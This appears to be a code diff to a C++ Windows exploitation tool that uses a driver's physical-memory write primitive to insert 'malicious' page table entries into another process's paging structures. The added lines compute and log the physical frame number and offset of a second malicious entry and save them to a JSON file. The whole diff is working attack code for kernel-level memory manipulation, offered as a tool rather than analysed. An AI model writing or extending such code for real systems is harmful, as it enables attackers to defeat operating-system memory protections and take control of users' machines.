@@ -140,6 +140,7 @@ namespace supermode
 		uint64_t offset;
 	};
 	PTE_PFN mal_pte_pfn;
+	PTE_PFN mal_pte2_pfn;
 
 	typedef struct VAD_NODE {
 		VAD_NODE* Left;
@@ -507,6 +508,10 @@ namespace supermode
 		mal_pte.Accessed = 1;
 		
 		uintptr_t mal_pte_phys = mal_pointer_pte_struct[PT] + mal_pointer_pte_ind[PT] * sizeof(uintptr_t);
+		mal_pte2_pfn = calc_pfnpte_from_addr(mal_pte_phys);
+
+		std::cout << "Offset2: " << mal_pte2_pfn.offset << std::endl;
+		std::cout << "PFN2: " << mal_pte2_pfn.pfn << std::endl;
 		
 		wnbios.write_physical_memory(mal_pte_phys, &mal_pte, sizeof(PTE));
 		std::cout << "inserted second malicious pte at index " << mal_pointer_pte_ind[PT] << " [" << std::hex << mal_pte_phys << "] " << " pointing to pfn " << mal_pte_pfn.pfn << std::endl;
@@ -578,6 +583,8 @@ namespace supermode
 		j["cr3"] = wnbios.get_system_dirbase();
 		j["target_cr3"] = target_cr3;
 		j["mal_pte_offset"] = mal_pte_pfn.offset;
+		j["mal_pte2_offset"] = mal_pte2_pfn.offset;
+		j["mal_pte2_pfn"] = mal_pte2_pfn.pfn;
 
 		std::ofstream out_file("C:\\indices.json");
 		out_file << j.dump();
